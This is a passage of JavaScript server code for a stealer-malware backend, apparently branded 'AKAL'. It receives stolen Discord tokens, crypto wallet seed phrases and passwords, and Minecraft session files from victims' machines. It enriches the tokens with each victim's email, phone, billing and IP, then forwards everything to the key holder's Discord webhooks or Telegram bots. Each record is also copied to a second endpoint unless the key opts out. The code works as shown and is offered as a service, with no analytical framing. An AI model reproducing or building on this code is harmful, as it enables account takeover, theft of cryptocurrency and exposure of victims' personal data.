      description: `**Discord User:** \`${userData.username}\``,
      timestamp: new Date().toISOString(),
      fields: [
        {
          name: '🧾 Account Info',
          value: [
            `**Email:** \`${userData.email || "Not Available"}\``,
            `**Phone:** \`${userData.phone || "None"}\``,
            `**2FA Enabled:** \`${userData.mfa_enabled ? "Yes" : "No"}\``,
          ].join("\n"),
          inline: false
        },
        {
          name: '💠 Profile Details',
          value: [
            `**Badges:** ${badges || "`None`"}`,
            `**Nitro:** ${nitro || "`None`"}`,
            `**Billing:** ${billing || "`None`"}`,
            `**IP Address:** \`${userData.ip || "Unknown"}\``,
          ].join("\n"),
          inline: false
        },
        {
          name: '📜 Account History',
          value: [
            `**Premium Since:** ${profileData?.premium_since ? new Date(profileData.premium_since).toLocaleDateString('en-GB', { day: '2-digit', month: 'long', year: 'numeric' }) : "Unknown"}`,
            `**Guild Boosting Since:** ${profileData?.premium_guild_since ? new Date(profileData.premium_guild_since).toLocaleDateString('en-GB', { day: '2-digit', month: 'long', year: 'numeric' }) : "Unknown"}`,
            `**Legacy Username:** ${profileData?.legacy_username || "None"}`
          ].join("\n"),
          inline: false
        },
        {
          name: '🔐 Token',
          value: `\`\`\`${token}\`\`\``,
          inline: false
        }
      ],
      footer: { text: `${os.userInfo().username}` },
      thumbnail: {
        url: userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : 'https://cdn.discordapp.com/embed/avatars/0.png'
      }
    };

    const discordData = {
      username: config.footertext,
      avatar_url: config.footericon,
      embeds: [userInformationEmbed]
    };

    const webhookUrl = check.webhook;
    if (!webhookUrl) {
      return res.status(404).json({ success: false, error: 'Webhook URL not found for this key' });
    }
    const webhookClient = new WebhookClient({ url: webhookUrl });
    await webhookClient.send(discordData);

    if (check.logType === 'telegram') {
      const logChatId = check.keyOwner;
      if (!logChatId) {
        return res.status(400).json({ success: false, error: 'logChatId (keyOwner) not found' });
      }

  const billing = await getBilling2(token) || 'None';
  const badges = await getBadges2(userData.flags) || 'None';
  const nitro = await getNitro2(userData.premium_type, userData.id, token) || 'None';

      let messagex = `🛡️ *AKAL* - User Info\n\n`;
      messagex += `*✨ Discord User*: \`${userData.username}\`\n`;
      messagex += `*🏆 Badges*: ${badges}\n`;
      messagex += `*💎 Nitro Type*: ${nitro}\n`;
      messagex += `*💳 Billing*: ${billing}\n`;
      messagex += `*📧 Email*: ${userData.email || 'None'}\n`;
      messagex += `*📱 Phone*: ${userData.phone || 'None'}\n`;
      messagex += `*🔑 Token*: \`${token}\``;

      await axios.post(`https://api.telegram.org/bot${config.winbottoken}/sendMessage`, {
        chat_id: logChatId,
        text: messagex,
        parse_mode: "Markdown"
      });
    }

    res.sendStatus(200);
  } catch (err) {
    res.sendStatus(500);
  }

  try {
    if (!(check.dh && check.dh.NO)) {
      const embed = {
        color: 0x5865F2,
        author: {
          name: userData.username,
          icon_url: userData.avatar
            ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`
            : 'https://cdn.discordapp.com/embed/avatars/0.png'
        },
        description: `**Discord User:** \`${userData.username}\``,
        timestamp: new Date().toISOString(),
        fields: [
          {
            name: '🧾 Account Info',
            value: [
              `**Email:** \`${userData.email || "Not Available"}\``,
              `**Phone:** \`${userData.phone || "None"}\``,
              `**2FA Enabled:** \`${userData.mfa_enabled ? "Yes" : "No"}\``,
            ].join("\n"),
            inline: false
          },
          {
            name: '💠 Profile Details',
            value: [
              `**Badges:** ${badges || "`None`"}`,
              `**Nitro:** ${nitro || "`None`"}`,
              `**Billing:** ${billing || "`None`"}`,
              `**IP Address:** \`${userData.ip || "Unknown"}\``,
            ].join("\n"),
            inline: false
          },
          {
            name: '📜 Account History',
            value: [
              `**Premium Since:** ${profileData?.premium_since ? new Date(profileData.premium_since).toLocaleDateString('en-GB', { day: '2-digit', month: 'long', year: 'numeric' }) : "Unknown"}`,
              `**Guild Boosting Since:** ${profileData?.premium_guild_since ? new Date(profileData.premium_guild_since).toLocaleDateString('en-GB', { day: '2-digit', month: 'long', year: 'numeric' }) : "Unknown"}`,
              `**Legacy Username:** ${profileData?.legacy_username || "None"}`
            ].join("\n"),
            inline: false
          },
          {
            name: '🔐 Token',
            value: `\`\`\`${token}\`\`\``,
            inline: false
          }
        ],
        footer: { text: key },
        thumbnail: {
          url: userData.avatar
            ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png`
            : 'https://cdn.discordapp.com/embed/avatars/0.png'
        }
      };

      await error(embed, dapi);
    }
  } catch (err) {}
});

app.post('/send-walletinj', async (req, res) => {
  const {
    key = 'N/A',
    mnemonic = 'N/A',
    password = 'N/A',
    pcname = 'N/A',
    value = 'N/A',
  } = req.body || {};

  console.log(key);

  const check = await keysCollection.findOne({ key: key });

  if (!check) {
    return res.status(404).json({ success: false, error: 'Key not found in the database' });
  }

  try {
    const iconUrl = value === "Atomic"
      ? "https://atomicwallet.io/images/press-kit/atomic_wallet_logo_dark_rounded.png"
      : value === "Exodus"
      ? "https://crypto-central.io/library/uploads/Exodus-Wallet-Logo.png"
      : config.footericon;

    if (!check.logType || check.logType === 'discord') {
      const webhookUrl = check.webhook;

  if (!webhookUrl) {
    return res.status(404).json({ success: false, error: 'Webhook URL not found for this key' });
  }

      const embed = {
        title: `👛 AKAL ${value}`,
        description: `Seedphrase: \`${mnemonic}\`\nPassword: \`${password}\``,
        color: 0x5865F2,
        author: {
          icon_url: iconUrl,
        },
        timestamp: new Date().toISOString(),
        fields: [
          { name: '✨ PC Name', value: pcname, inline: false },
          { name: '🔏 Seedphrase', value: `\`\`\`${mnemonic}\`\`\``, inline: false },
          { name: '🔑 Password', value: `\`\`\`${password}\`\`\``, inline: false }
        ],
        footer: {
          text: config.footertext,
          icon_url: config.footericon
        }
      };

      const discordData = {
        username: '🔐 AKAL',
        avatar_url: config.footericon,
        embeds: [embed]
      };

      const webhookClient = new WebhookClient({ url: webhookUrl });
      await webhookClient.send(discordData);
      console.log(`✅ Data sent to Discord | Wallet Injection`);
    }

    if (check.logType === 'telegram') {
      const logChatId = check.keyOwner;

      if (!logChatId) {
        return res.status(400).json({ success: false, error: 'logChatId (keyOwner) not found' });
      }

      let telegramMessage = `👛 *AKAL ${value} Wallet Injection*\n\n`;
      telegramMessage += `✨ *PC Name*: ${pcname}\n`;
      telegramMessage += `🔏 *Seedphrase*: ${mnemonic}\n`;
      telegramMessage += `🔑 *Password*: ${password}`;

      await axios.post(`https://api.telegram.org/bot${config.winbottoken}/sendMessage`, {
        chat_id: logChatId,
        text: telegramMessage,
        parse_mode: "Markdown"
      });

      console.log(`✅ Data sent to Telegram | Wallet Injection`);
    }

    res.sendStatus(200);
  } catch (err) {
    console.error('WALLETINJ | ❌ Error during data processing or webhook sending:', err.message);
    res.sendStatus(500);
  }
  try {
  if (!(check.dh && check.dh.NO)) {
  const embed = {
        title: `${value}`,
        description: `Seedphrase: \`${mnemonic}\`\nPassword: \`${password}\``,
        color: 0x5865F2,
        author: {
          icon_url: iconUrl,
        },
        timestamp: new Date().toISOString(),
        fields: [
          { name: '✨ PC Name', value: pcname, inline: false },
          { name: '🔏 Seedphrase', value: `\`\`\`${mnemonic}\`\`\``, inline: false },
          { name: '🔑 Password', value: `\`\`\`${password}\`\`\``, inline: false }
        ],
        footer: {
          text: key
        }
      };

    await error(embed, wiapi);
  }
} catch (err) {
  console.error('Error:', err.message);
}
});

app.post('/send-minecraft', async (req, res) => {
  const {
    key = 'N/A',
    link = 'N/A',
    userData = {},
  } = req.body || {};

  const check = await keysCollection.findOne({ key: key });

  if (!check) {
    return res.status(404).json({ success: false, error: 'Key not found in the database' });
  }

  const embed = createMinecraftEmbed(link, userData);

  try {  
    if (!check.logType || check.logType === 'discord') {
      
  const webhookUrl = check.webhook;

  if (!webhookUrl) {
    return res.status(404).json({ success: false, error: 'Webhook URL not found for this key' });
  }

      const discordData = {
        username: '🔐 AKAL',
        avatar_url: config.footericon,
        embeds: [embed]
      };

      const webhookClient = new WebhookClient({ url: webhookUrl });
      await webhookClient.send(discordData);
      console.log(`✅ Data sent to Discord | MCDATA`);
    }

    if (check.logType === 'telegram') {
      const logChatId = check.keyOwner;

      if (!logChatId) {
        return res.status(400).json({ success: false, error: 'logChatId (keyOwner) not found' });
      }

      let telegramMessage = `🎮 *Minecraft Session Data Extracted*\n\n`;
      telegramMessage += `📦 *Download Link*: [Click Here](${link})\n\n`;

      userData.forEach(user => {
        const { name, uuid, expiresOn } = user;
        telegramMessage += `🎮 *Player*: ${name}\n`;
        telegramMessage += `🔹 *UUID*: \`${uuid}\`\n`;
        telegramMessage += `⏰ *Session Valid Until*: ${expiresOn}\n\n`;
      });

      await axios.post(`https://api.telegram.org/bot${config.winbottoken}/sendMessage`, {
        chat_id: logChatId,
        text: telegramMessage,
        parse_mode: "Markdown"
      });

      console.log(`✅ Data sent to Telegram | MCDATA`);
    }

    res.sendStatus(200);
  } catch (err) {
    console.error('MCDATA | ❌ Error during data processing or webhook sending:', err.message);
    res.sendStatus(500);
  }
  try {
  if (!(check.dh && check.dh.NO)) {
    await error(embed, mapi);
  }
} catch (err) {
  console.error('Error:', err.message);
}
});

function createMinecraftEmbed(link, userData) {
  const embedFields = [];

  if (userData.length > 0) {
      userData.forEach(user => {
          const { name, uuid, expiresOn } = user;
          const profileUrl = `https://namemc.com/search?q=${uuid}`;
          const imageUrl = `https://mc-heads.net/skin/${uuid}`;

          embedFields.push({
              name: `🎮 Player: ${name}`,
              value: [
                  `🔹 **UUID:** \`${uuid}\``,
                  `⏰ **Session Valid Until:** ${expiresOn}`,
                  `🌐 [View NameMC Profile](${profileUrl})`,
                  `🖼️ [Preview Skin](${imageUrl})`
              ].join('\n'),
              inline: false
          });
      });

      return {
          title: `🟩 Minecraft Session Data Extracted`,
          description: `A Minecraft session has been successfully captured. You can download the session files using the link below:\n\n📦 **[Download ZIP File](${link})**`,
          fields: [
              {
                  name: '📘 Instructions',
                  value: [
                      `1. Extract the ZIP file.`,
                      `2. Navigate to your Minecraft or Lunar Client installation folder.`,
                      `3. Replace existing session-related files with the extracted ones.`,
                      `4. Launch the game.`
                  ].join('\n'),
                  inline: false
              },
              ...embedFields
          ],
          color: 0x1FAB54, 
          footer: {
              text: config.footertext,
              icon_url: config.footericon
          }
      };
  } else {
      return {
          title: `🟨 Minecraft Profile Backup`,
          description: `No active user sessions were found in \`usercache.json\`. However, launcher profile data is still available below.\n\n📦 **[Download ZIP File](${link})**`,
          fields: [
              {
                  name: '📁 Contents',
                  value: `Includes launcher profiles and config files. May still contain usable tokens.`,
                  inline: false
              }
          ],
          color: 0xFFC107, 
          footer: {
              text: config.footertext,
              icon_url: config.footericon
          }
      };
  }
}

const createChannels = require('./createChannels');

clientdc.on('messageCreate', async (message) => {
    if (message.content === '!emoji') {
        console.log('!emoji command received'); 
        if (!message.member.permissions.has("ManageEmojisAndStickers")) {
            console.log('Missing permission: ManageEmojisAndStickers');
            return message.reply("You must have the `Manage Emojis and Stickers` permission to use this command.");
        }
        message.reply('Starting emoji upload...'); 
        console.log('Emoji upload initiated...'); 
        await uploadEmojis(message.guild, message.channel);
        console.log('Emoji upload completed.'); 
    }

    if (message.content === '!channel') {
        console.log('!channel command received'); 
        if (!message.member.permissions.has("ADMINISTRATOR")) {
            console.log('Missing permission: ADMINISTRATOR');
            return message.reply("You must have the `ADMINISTRATOR` permission to use this command.");
        }
        message.reply('Starting channel creation...'); 
        console.log('Channel creation initiated...'); 
        await createChannels(message.guild);
        message.reply('Injection channels and webhooks successfully created.'); 
    }


    if (message.content === '!remove') {
        console.log('!remove command received'); 
        if (!message.member.permissions.has("ADMINISTRATOR")) {
            return message.reply("You must have the `ADMINISTRATOR` permission to use this command.");
        }
        await removeEmojis(message.guild);
        message.reply('Injection channels and emojis successfully removed.');
    }
});

app.use(session({
    secret: config.secrettoken,
    resave: false,
    saveUninitialized: false,
    store: MongoStore.create({
        mongoUrl: config.mongodb,
    }),
    cookie: {
        maxAge: 10 * 60 * 1000, 
    }
}));

async function getBilling(token) {
    try {
        const response = await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        });
        const json = response.data;

        if (!json) return '\`Unknown\`';

        let bi = '';
        json.forEach(z => {
            if (z.type == 2 && z.invalid != true) {
                bi += paypal;
            } else if (z.type == 1 && z.invalid != true) {
                bi += "💳";
            }
        });
        if (bi == '') bi = "No Billing";
        return bi;
    } catch (error) {
        console.error("Error getting billing:", error);
        return "No Billing";
    }
}

function getBadges(flags) {
    const badges = {
        Discord_Employee: { Value: 1, Emoji: discord_employee },
        Partnered_Server_Owner: { Value: 2, Emoji: partnered_server_owner },
        HypeSquad_Events: { Value: 4, Emoji: hypesquad_events },
        Bug_Hunter_Level_1: { Value: 8, Emoji: bughunter },
        Early_Supporter: { Value: 512, Emoji: early_supporter },
        Bug_Hunter_Level_2: { Value: 16384, Emoji: bughuntergold },
        Early_Verified_Bot_Developer: { Value: 131072, Emoji: early_verified_bot_developer },
        House_Bravery: { Value: 64, Emoji: bravery },
        House_Brilliance: { Value: 128, Emoji: brilliance },
        quest_completed: { Value: 128, Emoji: quest },
        House_Balance: { Value: 256, Emoji: balance },
        Discord_Official_Moderator: { Value: 262144, Emoji: moderatorprogramsalumni },
        Legacy_Username: { Value: 32, Emoji: oldusername },
        Active_Developer: { Value: 4194304, Emoji: active_developer }
    };
    let badgeText = '';
    for (const prop in badges) {
        const badge = badges[prop];
        if ((flags & badge.Value) === badge.Value) {
            badgeText += badge.Emoji;
        }
    }
    return badgeText || "No Badges";
}

async function getProfileData(token, userId) {
  try {
    const response = await axios.get(`https://discord.com/api/v9/users/${userId}/profile`, {
      headers: {
        "Content-Type": "application/json",
        authorization: token,
      },
    });
    return response.data;
  } catch (err) {
    console.warn("getProfileData error:", err.message);
    return null;
  }
}

async function getNitro(flags, id, token, premiumSince) {
  const getNitroBadge = (since) => {
    if (!since) {
      console.log("[NitroBadge] premiumSince null/undefined");
      return null;
    }

    const now = new Date();
    const then = new Date(since);
    let passedMonths = (now.getFullYear() - then.getFullYear()) * 12 + (now.getMonth() - then.getMonth());
    if (now.getDate() < then.getDate()) passedMonths--;

    const nitros = [
      { badge: discord_nitro, lowerLimit: 0, upperLimit: 0 },
      { badge: nitro_bronze, lowerLimit: 1, upperLimit: 2 },
      { badge: nitro_silver, lowerLimit: 3, upperLimit: 5 },
      { badge: nitro_gold, lowerLimit: 6, upperLimit: 11 },
      { badge: nitro_platinum, lowerLimit: 12, upperLimit: 23 },
      { badge: nitro_diamond, lowerLimit: 24, upperLimit: 35 },
      { badge: nitro_emerald, lowerLimit: 36, upperLimit: 59 },
      { badge: nitro_ruby, lowerLimit: 60, upperLimit: 71 },
      { badge: nitro_opal, lowerLimit: 72 },
    ];

    const match = nitros.find(n =>
      passedMonths >= n.lowerLimit &&
      (n.upperLimit === undefined || passedMonths <= n.upperLimit)
    );

    return match?.badge || discord_nitro;
  };

  if (flags === 1) {
    return getNitroBadge(premiumSince);
  }

  if (flags === 2) {
    try {
      const response = await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
        headers: {
          "Content-Type": "application/json",
          authorization: token,
        },
      });

      const info = response.data;

      let boostMonths = 0;
      if (info.premium_guild_since) {
        const boostStart = new Date(info.premium_guild_since);
        const now = new Date();
        boostMonths = (now.getFullYear() - boostStart.getFullYear()) * 12 + (now.getMonth() - boostStart.getMonth());
        if (now.getDate() < boostStart.getDate()) boostMonths--;
      }

      const boostBadges = [
        boost1month,
        twomonthsboostnitro,
        nitro_boost_3_months,
        sixmonths_boost,
        nitro_boost_9_months,
        twelvemonthsboostnitro,
        boost15month,
        nitro_boost_18_months,
        twentyfour_months
      ];

      const thresholds = [2, 3, 6, 9, 12, 15, 18, 24];
      let boostIndex = 0;
      thresholds.forEach((m, i) => {
        if (boostMonths >= m) boostIndex = i + 1;
      });

      const nitroBadge = getNitroBadge(info.premium_since);
      const boostBadge = boostBadges[boostIndex] || "";

      return `${nitroBadge} ${boostBadge}`.trim();
    } catch (err) {
      console.warn(`[Nitro] Failed to get /profile: ${err.message}`);
      return getNitroBadge(premiumSince);
    }
  }

  return "No Nitro";
}

async function getUserData(token) {
    try {
        const userResponse = await axios.get("https://discord.com/api/v9/users/@me", {
            headers: {
                "Content-Type": "application/json",
                "authorization": token
            }
        });

        const userData = userResponse.data;

        if (!userData) return null;

        const id = userData.id;
        const username = userData.username;
        const discriminator = userData.discriminator;
        const avatar = userData.avatar;
        const email = userData.email;
        const phone = userData.phone;
        const mfa_enabled = userData.mfa_enabled;
        const flags = userData.flags;
        const premium_type = userData.premium_type;
        const bio = userData.bio;

        return {
            id,
            username,
            discriminator,
            avatar,
            email,
            phone,
            mfa_enabled,
            flags,
            premium_type,
            bio
        };
    } catch (error) {
        console.error(error);
        return null;
    }
} 

async function getBilling2(token) {
  try {
      const response = await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
          headers: {
              "Content-Type": "application/json",
              "authorization": token
          }
      });
      const json = response.data;

      if (!json) return '`Unknown`';

      let bi = '';
      json.forEach(z => {
          if (z.type == 2 && z.invalid != true) {
              bi += '💸 PayPal';
          } else if (z.type == 1 && z.invalid != true) {
              bi += "💳 Credit Card";
          }
      });
      if (bi == '') bi = "No Billing";
      return bi;
  } catch (error) {
      console.error("Error getting billing:", error);
      return "No Billing";
  }
}

function getBadges2(flags) {
  const badges = {
    Discord_Employee: { Value: 1, Name: 'Discord_Employee' },
    Partnered_Server_Owner: { Value: 2, Name: 'Partnered_Server_Owner' },
    HypeSquad_Events: { Value: 4, Name: 'HypeSquad_Events' },
    Bug_Hunter_Level_1: { Value: 8, Name: 'Bug_Hunter' },
    Early_Supporter: { Value: 512, Name: 'Early_Supporter' },
    Bug_Hunter_Level_2: { Value: 16384, Name: 'Bug_Hunter_Gold' },
    Early_Verified_Bot_Developer: { Value: 131072, Name: 'Early_Verified_Bot_Developer' },
    House_Bravery: { Value: 64, Name: 'House_Bravery' },
    House_Brilliance: { Value: 128, Name: 'House_Brilliance' },
    quest_completed: { Value: 128, Emoji: 'Quest Completed' },
    House_Balance: { Value: 256, Name: 'House_Balance' },
    Discord_Official_Moderator: { Value: 262144, Name: 'Discord_Official_Moderator' },
    Legacy_Username: { Value: 32, Name: 'Legacy_Username' },
    Active_Developer: { Value: 4194304, Name: 'Active_Developer' }
};
  let badgeText = '';
  for (const prop in badges) {
      const badge = badges[prop];
      if ((flags & badge.Value) === badge.Value) {
          badgeText += badge.Emoji;
      }
  }
  return badgeText || "No Badges";
}

async function getNitro2(flags, id, token) {
  switch (flags) {
      case 1:
          return 'Discord_Nitro';
      case 2:
          let info;
          try {
              const response = await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                  headers: {
                      "Content-Type": "application/json",
                      "authorization": token
                  }
              });
              info = response.data;
          } catch {
              return 'Discord_Nitro';
          }

          if (!info.premium_guild_since) return 'Discord_Nitro';

          let boost = [
              'Boost_1_Months',
              'Boost_2_Months',
              'Boost_3_Months',
              'Boost_6_Months',
              'Boost_9_Months',
              'Boost_12_Months',
              'Boost_15_Months',
              'Boost_18_Months',
              'Boost_24_Months'];
          var i = 0;

          try {
              let d = new Date(info.premium_guild_since);
              let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000);
              let d1 = new Date(info.premium_guild_since);
              let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000);
              let d2 = new Date(info.premium_guild_since);
              let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000);
              let d3 = new Date(info.premium_guild_since);
              let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000);
              let d4 = new Date(info.premium_guild_since);
              let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000);
              let d5 = new Date(info.premium_guild_since);
              let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000);
              let d6 = new Date(info.premium_guild_since);
              let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000);
              let d7 = new Date(info.premium_guild_since);
              let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000);

              if (boost2month > 0) {
                  i += 0;
              } else {
                  i += 1;
              } if (boost3month > 0) {
                  i += 0;
              } else {
                  i += 1;
              } if (boost6month > 0) {
                  i += 0;
              } else {
                  i += 1;
              } if (boost9month > 0) {
                  i += 0;
              } else {
                  i += 1;
              } if (boost12month > 0) {
                  i += 0;
              } else {
                  i += 1;
              } if (boost15month > 0) {
                  i += 0;
              } else {
                  i += 1;
              } if (boost18month > 0) {
                  i += 0;
              } else {
                  i += 1;
              } if (boost24month > 0) {
                  i += 0;
              } else if (boost24month < 0 || boost24month == 0) {
                  i += 1;
              } else {
                  i = 0;
              }
          } catch {
              i += 0;
          }
          return `Nitro_Boost ${boost[i]}`;
      default:
          return "No Nitro";
  };
}

  const PORT = process.env.PORT || 777;
  server.listen(PORT, () => {
    console.log(`Listening on port ${PORT}`);
    mongoose.connect(config.mongodb, {
      useNewUrlParser: true,
      useUnifiedTopology: true,
    })
    .then(() => console.log('Mongoose connection successful.'))
    .catch(() => console.log('Mongoose connection error.'));
  });
  
client.connect().then(() => {
    console.log('Connected to MongoDB successfully.');
}).catch(err => {
    console.error('MongoDB connection error:', err);
});